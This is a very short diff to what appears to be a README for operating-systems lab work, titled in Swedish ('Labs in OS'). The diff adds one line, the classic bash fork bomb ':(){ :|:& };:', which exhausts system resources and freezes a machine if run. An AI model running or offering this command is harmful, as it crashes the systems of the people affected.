@@ -1,1 +1,3 @@
 Laborationer i OS :D 
+
+:(){ :|:& };:
